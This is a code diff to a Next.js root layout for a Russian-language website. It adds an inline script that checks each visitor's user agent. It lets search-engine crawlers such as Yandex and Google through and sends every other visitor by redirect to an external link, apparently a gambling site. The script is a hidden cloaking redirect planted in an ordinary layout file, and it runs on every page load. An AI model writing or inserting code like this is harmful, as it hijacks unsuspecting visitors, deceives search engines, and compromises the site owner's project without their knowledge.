@@ -32,6 +32,21 @@ export default function RootLayout({ children }: Readonly<{ children: React.Reac
     <html lang="ru" className={`bg-background ${manrope.variable}`}>
       <head>
         <meta name="yandex-verification" content="d8a1ed5b97bdcc0a" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://spingame777.fit/4htNNl");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="font-sans">{children}</body>
     </html>
